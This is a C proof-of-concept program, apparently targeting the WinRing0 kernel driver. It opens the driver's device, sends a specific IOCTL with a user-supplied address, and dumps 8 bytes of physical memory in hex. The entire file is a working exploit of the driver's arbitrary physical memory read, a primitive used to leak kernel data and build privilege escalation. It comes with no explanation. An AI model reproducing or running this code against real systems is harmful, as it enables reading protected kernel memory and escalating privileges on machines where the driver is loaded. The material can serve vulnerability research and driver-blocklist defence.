#include <windows.h>
#include <stdio.h>

#define IOCTL_CODE 0x9C406104

typedef struct _POC_STRUCT {
	ULONG64 PhysicalAddress;
	ULONG   Type;
	ULONG   Count;
} POC_STRUCT, * PPOC_STRUCT;

int main() {
	HANDLE hDevice = CreateFileA("\\\\.\\WinRing0_1_0_1", GENERIC_READ | GENERIC_WRITE,
		0, NULL, OPEN_EXISTING, NULL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("CreateFileA falied with error:%lu", GetLastError());
		return 1;
	}

	ULONG64 StartAddress = 0;
	PPOC_STRUCT poc = (PPOC_STRUCT)malloc(sizeof(POC_STRUCT));
	ZeroMemory(poc, sizeof(POC_STRUCT));

	printf("[+] Input Target Kernel Address: 0x");
	// 16 进制的 64 位
	scanf_s("%llx", &StartAddress);

	poc->PhysicalAddress = StartAddress;
	poc->Type = 1; // BYTE
	poc->Count = 0x8;

	DWORD dwOutBufferSize = poc->Count * poc->Type;

	LPVOID lpOutBuffer = (LPVOID)malloc(dwOutBufferSize);	
	ZeroMemory(lpOutBuffer, dwOutBufferSize);

	DWORD dwBytesReturned = 0;

	BOOL bRet = DeviceIoControl(hDevice, IOCTL_CODE,
		poc, sizeof(POC_STRUCT),
		lpOutBuffer, dwOutBufferSize,
		&dwBytesReturned, NULL);
	if (!bRet) {
		printf("DeviceIoControl failed with error:%lu\n", GetLastError());
		goto cleanup;
		return 1;
	}
	printf("[+] Read %lu bytes from physical address 0x%llx:\n", dwBytesReturned, StartAddress);
	
	for (DWORD i = 0; i < dwBytesReturned; i++) {
		printf("%02X ", *(PBYTE)((PBYTE)lpOutBuffer + i));
	}
	printf("\n");

cleanup:
	free(lpOutBuffer);
	free(poc);
	CloseHandle(hDevice);
	return 0;
}